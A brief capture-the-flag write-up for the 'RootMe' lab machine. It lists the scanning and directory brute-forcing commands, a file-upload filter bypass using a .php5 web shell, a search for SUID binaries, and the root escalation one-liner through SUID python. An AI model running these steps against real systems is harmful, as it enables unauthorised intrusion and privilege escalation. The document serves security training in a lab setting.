# CTF Writeup: RootMe

---

- Step 1: made nmap -sS -sC -sV -p- target_ip 22 and 80 open
- Step 2: made gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
--> got /panel hidden dir
- Step 3: accessed website which offers an file upload --> uploaded php shell script --> shell.php5 --> 
by passed security filtering with "5" --> tried others like shell.php#.jpg, but didn't work.
- Step 4: started listener and gained RCE in /var/www/ made ls -la and found hidden user.txt flag
- Step 5: checked out .bash_history which told me "python -c 'import os; os.execl("/bin/sh", "sh", "-p")'"
- Step 6: made find / -perm /4000 2>/dev/null to check for SUID binaries --> found /usr/bin/python which is unusual
- Step 7: ran /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
- Step 8: gained root --> retrieved flag

---

## Key Learnings

- Gained more Knowledge when it comes to SUID Binaries & Priv Escelation
- Further strengthened Knowledge about File Upload Vulnerabilities
